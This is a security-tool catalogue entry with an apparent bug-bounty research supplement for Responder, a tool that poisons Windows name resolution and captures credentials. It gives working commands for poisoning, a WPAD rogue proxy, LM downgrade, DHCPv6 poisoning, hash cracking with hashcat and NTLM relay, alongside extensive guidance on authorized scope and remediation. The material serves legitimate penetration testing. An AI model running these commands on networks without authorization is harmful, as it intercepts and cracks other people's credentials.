---
name: "responder"
categories:
  - blackarch-scanner
version: "v3.2.2.0.r8.g424fbe5"
homepage: "https://github.com/lgandx/Responder"
packaged-by: [blackarch, kali, aur, nixpkgs]
blackarch-builddate: "2026-06-13"
build-system: scripts
license: GPL-3.0-or-later
meta-checked: "2026-11-09"
github-repo: "lgandx/Responder"
github-stars: 6660
github-pushed: "2026-06-10"
github-archived: false
github-issues: 31
github-match: "exact"
gh-checked: "2026-11-07"
worth: 8.2
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
last-refresh: "2026-11-19"
github-commits-year: 58
gh-activity-checked: "2026-11-09"
---

# responder

> LLMNR/NBT-NS/mDNS poisoner and rogue-authentication toolkit: answers name-resolution broadcasts for hosts that do not exist and captures the NTLM/Basic credentials of anything that connects.

## What it's for

Responder (by Laurent Gaffie, lgandx) exploits Windows fallback name resolution: when a host fails to resolve a name via DNS, it broadcasts LLMNR/NBT-NS/mDNS queries, and Responder answers them claiming to be the requested host — so SMB, HTTP, MSSQL, LDAP, FTP, SMTP, IMAP, POP3, RDP, WinRM, DCE-RPC, DNS and VNC authentication attempts aimed at that name arrive at your machine and their challenge-response hashes get captured. The canonical use is standing it up on an assessment network segment and harvesting NetNTLMv2 hashes to crack offline (hashcat mode 5600); anything that can be tricked into reaching back to you — a file share path, a URL, a database client, a document with an external reference — becomes a capture trigger. It also runs a WPAD rogue proxy, can answer DHCP/DHCPv6 traffic, and pairs with its bundled `tools/RunFinger.py` (SMB-signing check) and `tools/MultiRelay.py` when you want to relay instead of crack. It does not decrypt anything itself: captured NTLM responses are cracked offline, or relayed elsewhere; and it is loud — analyze mode exists precisely to survey traffic without poisoning. Binaries: `Responder.py` (packaged as `responder` on BlackArch/Kali); companion wrappers `responder-dumphash` and `responder-report` on BlackArch.

## Typical use cases

### Poison name resolution and capture hashes

Start it on the interface that shares the segment with the targets (a VPN interface such as `tun0`, or `eth0` on-site):

```
sudo responder -I tun0 -v
```

Outcome: prints its banner with the enabled poisoners and rogue servers, then logs every poisoned query; when a client authenticates, the full capture line is printed and appended under `logs/` in the shape `user::DOMAIN:challenge:response:blob`. Any protocol trigger works the same — an SMB path, HTTP URL, MSSQL or LDAP client aimed at a nonexistent name yields its service-prefixed NetNTLMv2 line. `-v` adds per-packet detail; the tool keeps running until interrupted.

### Survey broadcast traffic without poisoning

For reconnaissance before committing to answers:

```
sudo responder -I tun0 -A -v
```

Outcome: analyze mode (`-A`) passively logs every NBT-NS, LLMNR and mDNS request — who is looking for which names, and at what rate — without responding, so nothing on the network breaks and no trace is left. Use it to size the capture opportunity (busy resolution traffic means quick hits) and to spot naming patterns worth impersonating before switching to poisoning.

### Export captured hashes for cracking

After captures have accumulated:

```
responder-dumphash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

Outcome: `DumpHash.py` (installed as `responder-dumphash` on BlackArch) writes every hash captured this session to file, ready for offline cracking — NetNTLMv2 is hashcat mode 5600 (NTLMv1 is 5500). A cracked password is a domain-valid credential; an uncrackable one still relays (see RunFinger below).

### Run the WPAD rogue proxy

On networks where browsers auto-detect proxy settings:

```
sudo responder -I tun0 -w
```

Outcome: starts the WPAD rogue proxy server, so hosts requesting `wpad.dat` via name resolution get Responder's instead — every browser configured for auto-proxy detection then routes its authentication through you. This widens capture beyond the SMB/HTTP cases to any proxied web login.

### Force authentication against the rogue proxy

When clients connect but do not volunteer credentials:

```
sudo responder -I tun0 -P
sudo responder -I tun0 -Pvd
```

Outcome: `-P` (ProxyAuth) forces NTLM/Basic authentication for proxy usage — the README marks it highly effective — and implicitly enables the WPAD server; adding `-d` answers DHCP broadcasts with WPAD injection, so freshly-leased hosts learn your WPAD address from their own DHCP exchange. `-F` (ForceWpadAuth) is the narrower variant that forces authentication on the `wpad.dat` retrieval itself for legacy networks.

### Capture plaintext credentials via Basic auth

When any Basic-auth-capable client (HTTP popups, proxies) will be tricked:

```
sudo responder -I tun0 -b
```

Outcome: the HTTP server returns a Basic authentication prompt instead of an NTLM handshake, so clients that play along send `user:password` in effectively cleartext — no cracking step needed. NTLM remains the default because most Windows clients refuse Basic.

### Downgrade to crackable LM responses

Against very old clients (Windows XP/2003 era), with `Challenge = 1122334455667788` set in `Responder.conf` first:

```
sudo responder -I tun0 --lm
```

Outcome: forces LM hashing downgrade for the NTLMSSP exchange; combined with a fixed, known challenge in the configuration file, the captured responses become trivially crackable with precomputed LM challenge tables (hashcat mode 5000/5500 lanes). Modern clients ignore the downgrade, so this is strictly a legacy-host play.

### Find relay targets by checking SMB signing

Before relaying instead of cracking, from the Responder package's tools directory (`/usr/share/responder/tools/` on packaged installs):

```
sudo python3 RunFinger.py -i 198.51.100.0/24
```

Outcome: fingerprints every host in the range for SMB signing state and SMB version, printing `(signing: False)` per host — the hosts without enforced signing are the ones where a captured authentication can be relayed onward (with `tools/MultiRelay.py` or impacket's relayers) instead of cracked. Run this first; relaying into a signing-enforced host fails closed.

### Answer DHCPv6 solicit messages

On IPv6-enabled segments, with `DHCPv6_Domain` set in `Responder.conf`:

```
sudo responder -I eth0 --dhcpv6 -v
```

Outcome: responds to DHCPv6 SOLICIT messages so Windows hosts adopt Responder as their DNS resolver of record — subsequent name lookups for any service resolve to your machine, converting IPv6 autoconfiguration into a credential-capture channel without touching the IPv4 side.

---

## Scope reality check (read before anything else)

Responder is not a web bug-bounty tool. It is an **active layer-2/3 man-in-the-middle** for a shared network segment: in poisoning mode it answers name-resolution broadcasts for hosts that are not you, and captures the authentication of **every** person and service on the segment that happens to look up a name that fails DNS. That is indiscriminate interception of third-party credentials. In almost every public web/API bounty program it is flatly out of scope, and running it against a production corporate LAN you do not own is the kind of action that ends engagements and invites criminal liability. It belongs to a narrow slice of work:

- **Authorized internal network assessments / network-scope bounty programs** that explicitly list LLMNR/NBT-NS/mDNS poisoning, NTLM relay, or "internal MITM" as permitted, with a named network segment and a window.
- **Your own lab** — a test domain and test clients you built to prove a technique or validate a detection.
- **Analyze mode (`-A`) only**, as a passive misconfiguration survey — verified in source: the poisoners log and decline to answer in Analyze mode. Caveat: configured protocol servers may still start in some builds, so treat `-A` as "poisoners silent," not a guaranteed receive-only interlock; pin the version and check enabled servers before assuming zero transmission (see Phase 0 below).

Everything in this supplement assumes one of those three. The single rule that keeps you inside the lines: **passive-first, poison only on an authorized segment with scoping configured, and never authenticate with a credential you capture.** A captured NetNTLMv2 hash is *evidence of a weakness*; using it to log in is a separate intrusion that your authorization almost certainly does not cover.

---

## Bug bounty / assessment workflow with Responder

The phases run passive→active. Phase 0 is safe almost everywhere; Phases 2–4 require an authorized segment and written permission for active MITM. Do not skip ahead on a shared production LAN.

### Phase 0 — Passive survey (analyze mode, zero poisoning)

Goal: prove the attack surface exists *without touching it*. Analyze mode listens and logs; it never answers, so no name resolution breaks and no credential is intercepted.

```bash
sudo responder -I eth0 -A -v
```

What you are measuring, and why each is a standalone finding:

- **Which protocols are live.** Every NBT-NS (UDP 137), LLMNR (UDP/5355) and mDNS (UDP/5353) query logged is a host falling back to broadcast name resolution — the precondition for the whole attack. "LLMNR/NBT-NS/mDNS enabled" is a reportable misconfiguration *by itself* (disable LLMNR via GPO, disable NBT-NS per-adapter, block mDNS) because it means any attacker on-segment could do what you are deliberately not doing.
- **Who is asking for what.** The query names reveal typos, decommissioned shares, WPAD lookups, and naming conventions worth impersonating later. A flood of `WPAD` queries means Phase 3 (WPAD proxy) will pay; `ISATAP`/`_dosvc` noise is expected (Responder ignores both by default — see config).
- **A passive host roster.** Every logged query is a `(source IP → queried name)` pair, so the analyzer output doubles as a network map: which workstations resolve which shares, which names fail DNS and fall back to broadcast, and which hosts are the chattiest — all without poisoning. (Responder's legacy Browser/BOWSER module on UDP/138 is disabled by default in current builds, so analyze mode no longer issues Browser backup requests — the roster here is built from the poisoner-protocol queries themselves.)

Analyze mode is also the *retest* tool: after a client remediates LLMNR/NBT-NS, re-run `-A` and confirm the queries have stopped. Capture this console output; it is your Phase 0 evidence (see Reporting).

### Phase 1 — Target the segment, not the building

Before you ever enable a poisoner, constrain *who* Responder will answer. The default behaviour answers everyone on the segment — on a real network that is both a DoS against legitimate name resolution and an over-collection of credentials you have no authorization to hold. Edit `Responder.conf` first:

```ini
; Answer ONLY the authorized lab/scope hosts (TEST-NET examples)
RespondTo = 198.51.100.40-50, 198.51.100.77
; Answer only the names you were cleared to impersonate
RespondToName = WPAD, FILESRV01
; Exclude requester IPs (dual-stack hosts need BOTH their IPv4 and IPv6 here)
DontRespondTo = 198.51.100.10, 198.51.100.11
; Queried-NAME denylist — filters names you will not answer FOR,
; it does NOT exclude the machines named here (an IPS box querying WPAD
; still gets answered unless its IP is in DontRespondTo above)
DontRespondToName = NAC, IPS, IDS
```

`RespondTo`/`RespondToName` are an allowlist; `DontRespondTo`/`DontRespondToName` are a denylist (`ISATAP` is already denied by default, and `DontRespondToTLD = _dosvc` suppresses Delivery-Optimization mDNS noise). Name matching is exact uppercase membership — `FILESRV01` does not also cover `FILESRV01.corp.example.com`. Two containment limits verified against the source (v3.2.2.0): **dual-stack hosts must have both IPv4 and IPv6 addresses in `DontRespondTo`** or the unlisted family slips through (IPv4-mapped `::ffff:` addresses collapse to the IPv4 entry, so only native IPv6 creates the gap); and the mDNS poisoned answer is sent **unicast to the triggering requester** in current builds (`soc.sendto(Buffer, self.client_address)`), so the IP allowlist does bound the direct recipient. This is NOT universal history: the archived SpiderLabs/Trustwave fork (commit `c02c7485`, 2019) sent the poisoned answer to the **multicast group** (`MADDR=224.0.0.251:5353`) after passing the requester filter — blast radius = the whole segment regardless of `RespondTo`. Legacy images and CTF boxes still carry such forks, so validate recipient behavior on your exact build before assuming containment. Application-level filters are not network isolation: where strictly bounded blast radius is required, use segment isolation as well. Scoping is the difference between a surgical PoC against one authorized client and an incident report naming you.

### Phase 2 — Poison and capture (authorized segment only)

Goal: demonstrate that a host on the segment can be made to authenticate to an attacker. With scoping set, bring up the poisoners and rogue servers:

```bash
sudo responder -I eth0 -v
```

Trigger a single capture from an *authorized test host* (an SMB path to a nonexistent name, a mistyped share). A capture prints the service-prefixed NetNTLMv2 line and writes `logs/SMB-NTLMv2-198.51.100.77.txt`. That one line — a real domain user authenticating to your rogue server because of a name-resolution fallback — is the finding. You do not need to capture the whole segment; one scoped host proves the class.

Set `AutoIgnoreAfterSuccess = On` in the config (it ships `Off`) when you only need proof: Responder then stops answering a host once it has a hash for it, which minimises both collateral and noise.

### Phase 3 — Establish severity: can it be cracked, or relayed?

A captured hash has two escalation paths; which one applies sets the severity. **Do neither beyond what proves the point, and never use the result to access a system.**

- **Crackable → weak-password finding.** Export and run a bounded offline crack (your own hardware, a standard wordlist). If `rockyou` cracks it in seconds, the finding is "domain credentials are guessable *and* interceptable" — High. If it does not crack, say so; an uncracked hash is still a relay candidate.
- **Relayable → SMB-signing finding.** If SMB signing is not enforced on segment hosts, a captured authentication can be *relayed* to another host without cracking. Prove signing state first with the bundled fingerprinter — do not fire a relay blind:

```bash
sudo python3 /usr/share/responder/tools/RunFinger.py -i 198.51.100.0/24
```

Hosts printed `(SMB Signing: False)` are relay-able; that output alone (SMB signing not required) is a reportable hardening finding independent of any relay. If the program authorizes an actual relay PoC, turn off Responder's own SMB/HTTP servers and hand the capture to a relayer (`tools/MultiRelay.py -t <authorized target> -u ALL`, or impacket `ntlmrelayx.py`). Scope the relay to a single authorized target and the least-impact action that proves access (e.g. a who-am-I / signing check), never a hash dump on a production DC.

### Phase 4 — Shut down cleanly and account for what you captured

`Ctrl-C` Responder. Then do the custodial work that keeps you defensible:

- Confirm no rogue listener survived (`sudo ss -tulpn | grep -E ':(80|443|445|139|53|5355|5353|137|88|3128|547)\b'` should show nothing of yours).
- Treat `Responder.db` and everything under `logs/` as **sensitive evidence of other people's credentials.** Collect exactly what the report needs, store it encrypted, and destroy the rest at engagement end per the rules of engagement. Captured hashes are not yours to keep.
- Record the exact window you were poisoning (start/stop timestamps) so the client can reconcile it against their SOC alerts.

---

## Where the money is with Responder

For a network-scope engagement, the reportable classes are misconfigurations Responder *proves*, not "I captured a hash." Ordered by how often they pay and how defensible the finding is:

| Priority | Finding class | What reaches it | Typical severity | Dupe / collateral risk |
|---|---|---|---|---|
| 1 | LLMNR/NBT-NS/mDNS fallback enabled | `-A` analyze mode (passive) | Medium (High as a chain root) | Low dupe; **zero** collateral — safe everywhere |
| 2 | SMB signing not enforced (relay-able) | `RunFinger.py -i <range>` | High | Low collateral (fingerprint only) |
| 3 | Interceptable + **crackable** domain creds | poison → `logs/*-NTLMv2-*.txt` → hashcat 5600 | High–Critical | High collateral — scope tightly |
| 4 | NTLM relay to a second host (no creds needed) | MultiRelay / ntlmrelayx against signing-off host | Critical | High — authorized relay target only |
| 5 | WPAD auto-proxy abuse | `-w`, or `-P` (ProxyAuth) | High | High — proxies whole segment's web auth |
| 6 | IPv6/DHCPv6 unmanaged (mitm6-style) | `--dhcpv6`, `--rdnss`, `--dnssl` | High | Very high — can disrupt IPv6 segment-wide |
| 7 | Legacy NTLMv1/LM acceptance | `--lm`, `--disable-ess` (fixed Challenge) | High | Medium — only legacy hosts respond |
| 8 | Kerberos AS-REQ pre-auth capture | `KerberosMode = CAPTURE` → hashcat 7500 | Medium–High | Low–medium |
| 9 | Cleartext Basic-auth credentials | `-b` (basic) | High (plaintext) | High — only on clients that accept Basic |
| 10 | WebDAV auth coercion | `-E` (ErrorCode) | Medium (as a chain step) | Medium |

Priorities 1–2 are the safe, high-yield core of most engagements: both are provable with near-zero collateral and are rarely duplicated because teams forget LLMNR/NBT-NS exist. Priorities 3–6 are the high-impact escalations and the high-collateral ones — they need an authorized segment, scoping, and a light touch.

---

## Command recipes

Annotated command → expected output. Low-impact settings are called out; the passive ones are safe to run broadly, the active ones are authorized-segment-only.

```bash
# PASSIVE survey — safe almost anywhere. Sends nothing, answers nothing.
sudo responder -I eth0 -A -v
#  -> "[Analyze mode: ...]" banner; logs every NBT-NS/LLMNR/MDNS query with source IP
#     and queried name to console and logs/Analyzer-Session.log. No capture, no DoS.
```

```bash
# SCOPED capture — authorized segment only. Set RespondTo/RespondToName in
# Responder.conf FIRST so only cleared hosts/names are answered.
sudo responder -I eth0 -v
#  -> banner lists enabled poisoners + rogue servers; on a trigger prints
#     "[SMB] NTLMv2-SSP Hash : user::DOMAIN:<challenge>:<response>:<blob>"
#     and writes logs/SMB-NTLMv2-<IP>.txt. One scoped host is enough to prove the class.
```

```bash
# Quiet, minimal-footprint capture for a long unattended window on a lab segment.
sudo responder -I eth0 -Q
#  -> -Q suppresses per-poison console spam; captures still land in logs/ and Responder.db.
#     Pair with AutoIgnoreAfterSuccess = On to stop answering a host once captured.
```

```bash
# Fingerprint SMB signing BEFORE any relay — decides severity, fires nothing at clients.
sudo python3 /usr/share/responder/tools/RunFinger.py -i 198.51.100.0/24
sudo python3 /usr/share/responder/tools/RunFinger.py -g -i 198.51.100.0/24   # grepable
#  -> per-host line with OS, domain, and "SMB Signing: True/False". False = relay-able.
```

```bash
# Export captured hashes for a BOUNDED offline crack (your hardware, standard list).
responder-dumphash                                   # BlackArch wrapper for tools/DumpHash.py
hashcat -m 5600 SMB-NTLMv2.txt /usr/share/wordlists/rockyou.txt   # NetNTLMv2
hashcat -m 5500 NTLMv1.txt   /usr/share/wordlists/rockyou.txt     # NetNTLMv1 (legacy)
hashcat -m 7500 kerb.txt     /usr/share/wordlists/rockyou.txt     # Kerberos AS-REQ pre-auth (KerberosMode=CAPTURE)
#  -> a crack-time of seconds on rockyou => "guessable AND interceptable" (High).
#     Crack to PROVE weakness; never use the password to authenticate anywhere.
```

```bash
# WPAD auto-proxy abuse — HIGH collateral (routes the segment's web auth). Authorized only.
sudo responder -I eth0 -wv            # rogue WPAD proxy server
sudo responder -I eth0 -Pv           # ProxyAuth: force NTLM/Basic for proxy use (runs Proxy-Auth on 3128)
#  NOTE: -P and -w are mutually exclusive (Responder exits if both are set). For WPAD *injection*,
#        combine -P with -d (DHCP) as in the README's -Pvd example — -P alone does not start WPAD.
```

```bash
# Legacy downgrade — only old (XP/2003-era) hosts respond. Set a FIXED challenge first:
#   in Responder.conf:  Challenge = 1122334455667788
sudo responder -I eth0 --lm -v           # force LM hashing downgrade
sudo responder -I eth0 --disable-ess -v  # disable Extended Session Security -> NTLMv1
#  -> captured responses become crackable against precomputed tables (fixed challenge).
```

```bash
# IPv6 / DHCPv6 poisoning — VERY high collateral; can disrupt the whole IPv6 segment.
# Scope with DHCPv6_Domain in Responder.conf so you only answer the authorized domain.
sudo responder -I eth0 --dhcpv6 -v
#  -> answers DHCPv6 SOLICIT; Windows hosts adopt you as DNS-of-record.
#     Leaving DHCPv6_Domain empty poisons ALL domains — the config itself warns against it.
```

```bash
# Evasion / relay helpers (authorized engagements).
sudo responder -I eth0 -t 1e -v          # set poisoned-answer TTL (hex; 1e = 30s) to blend in
sudo responder -I eth0 -N FILESRV01 -v   # canonical AnswerName for Kerberos-relay-over-HTTP
sudo responder -I eth0 -E -v             # return STATUS_LOGON_FAILURE to coerce WebDAV auth
```

A low-volume discipline specific to Responder: it does not generate request *volume*, it generates *interception breadth*. "Low impact" here means **narrow scoping and short windows**, not rate limits. The cheapest way to over-collect is to run it unscoped for hours; the cheapest way to stay clean is `-A` first, then scoped captures with `AutoIgnoreAfterSuccess = On`.

---

## Pitfalls, noise and scope discipline

How hunters get reports rejected, engagements terminated, or themselves into legal trouble with this tool — and the setting that prevents each:

- **Running it where MITM is not in scope.** The number-one failure. Responder is out of scope in essentially all web/API programs; it intercepts third-party credentials by design. Confirm the program names LLMNR/NBT-NS poisoning, NTLM relay, or internal MITM in writing before you start. "The target was in scope" does not make *poisoning the whole segment around it* in scope.
- **Poisoning unscoped on a shared LAN = DoS + over-collection.** With empty `RespondTo`/`RespondToName`, Responder answers every failed lookup on the segment, breaking legitimate name resolution for real users and hoovering up credentials you have no right to. Always set the allowlist (Phase 1). The config's own comments warn that empty `DHCPv6_Domain` "causes network disruption."
- **Using a captured credential to log in.** A captured or cracked hash is *evidence*. Authenticating with it — even to "confirm it works" — is a fresh intrusion that your authorization almost never covers and that crosses into CFAA/computer-misuse territory. Report crackability; stop there unless the rules of engagement explicitly authorize credential use and name the targets.
- **Firing a relay without checking signing.** Relaying into a signing-enforced host fails closed and is pure noise in the defender's logs. Run `RunFinger.py` first; relay only `SMB Signing: False` hosts, and only an authorized relay target.
- **DHCPv6/RA poisoning on a live segment.** `--dhcpv6`, `--rdnss` and `--dnssl` rewrite clients' DNS at the IPv6 layer and can black-hole name resolution network-wide. Treat as the highest-collateral option; scope with `DHCPv6_Domain`, prefer waiting for natural SOLICITs over `SendRA = On` (which is louder and more disruptive).
- **Leaving rogue servers running.** Responder binds many ports (SMB 445/139, HTTP 80, HTTPS 443, DNS 53, LLMNR 5355, MDNS 5353, Proxy 3128, Kerberos 88, LDAP 389/636, plus newer QUIC/SNMP/MQTT/MySQL listeners if enabled). An abandoned listener keeps intercepting after your window closes. Verify teardown (Phase 4) and record stop time.
- **Port conflicts masking the test.** If another service already holds 445/53/80, Responder's listener fails to bind and silently captures nothing — you conclude "not vulnerable" wrongly. Check the banner for bind errors; free the ports or disable the clashing server in `Responder.conf`.
- **mDNS/`_dosvc` and `ISATAP` noise.** Expected background chatter. Responder denies `ISATAP` and the `_dosvc` TLD by default; don't report them as live targets.
- **Treating the cracked password as the deliverable.** The deliverable is the *chain*: fallback name resolution enabled → interception possible → credential weak/relay-able. A lone cracked password without the interception context reads like you already had access.

---

## Reporting evidence

Capture these, redact the rest, and never ship more captured-credential material than the proof needs:

- **Phase 0 passive console** — the `-A` output showing specific hosts issuing LLMNR/NBT-NS/mDNS queries (source IP, queried name, timestamp). This alone substantiates "fallback name resolution enabled" with zero collateral. Save `logs/Analyzer-Session.log`.
- **The capture line, redacted** — the service-prefixed hash line proving a real host authenticated to your rogue server, with the username/domain and the *response/blob* portion redacted to the minimum that proves a valid NetNTLMv2 (or NTLMv1/Kerberos) response. Cite the log filename (`logs/SMB-NTLMv2-<IP>.txt`) and the exact timestamp.
- **Scoping proof** — a snippet of your `Responder.conf` showing `RespondTo`/`RespondToName` limited to authorized hosts, demonstrating you did *not* poison the whole segment. This is both evidence and your own defence.
- **Signing state** — `RunFinger.py` output listing `SMB Signing: False` hosts for any relay claim; this is the precondition that makes the relay severity real.
- **Crackability, not credentials** — state that the captured hash cracked (and how fast, with which wordlist) as the severity justification. Do **not** paste the plaintext password or use it; "cracked in 3s against rockyou" is the evidence.
- **Relay PoC (if authorized)** — the relayer's output showing authentication succeeded against the authorized target and the least-impact confirmation of access; never a credential dump from production.
- **Packet capture** — run a scoped `tcpdump -i eth0 -w responder-poc.pcap 'udp port 5355 or udp port 137 or udp port 5353'` alongside, filtered to the authorized host, so the poison request/response pair is independently verifiable from the wire without exposing other users' traffic.
- **Window and teardown** — exact start/stop timestamps of poisoning and confirmation that all rogue listeners were stopped, so the client can reconcile against their monitoring.

Severity framing: "LLMNR/NBT-NS/mDNS enabled" is Medium standalone, High as the root of an interception chain; "SMB signing not enforced" is High; "interceptable + crackable domain credentials" or a working relay is High–Critical. Always report the chain, map it to the engagement's rubric, and recommend the fixes at the source: disable LLMNR (GPO) and NBT-NS (per-adapter / DHCP option), block mDNS where unused, enforce SMB signing, and manage IPv6 (RA Guard, DHCPv6 snooping).

## References

- Responder repository (lgandx/Responder) — https://github.com/lgandx/Responder
- Responder README (current usage/flags) — https://raw.githubusercontent.com/lgandx/Responder/master/README.md
- Responder.conf (current config keys, defaults) — https://raw.githubusercontent.com/lgandx/Responder/master/Responder.conf
- Responder.py (optparse definitions — authoritative flag list) — https://github.com/lgandx/Responder/blob/master/Responder.py
- Responder wiki — Usage, Analyze mode, Poisoning LLMNR/NBT-NS/MDNS, MultiRelay, RunFinger — https://github.com/lgandx/Responder/wiki
- hashcat example hashes (modes 5500 NetNTLMv1, 5600 NetNTLMv2, 7500 Kerberos AS-REQ) — https://hashcat.net/wiki/doku.php?id=example_hashes
- impacket ntlmrelayx (relay alternative) — https://github.com/fortra/impacket

*Research supplement added 2026-11-16, grounded in the current lgandx/Responder README, Responder.conf, Responder.py source, and project wiki fetched 2026-11-16; hashcat mode references from hashcat.net (model: claude-opus-4-8).*
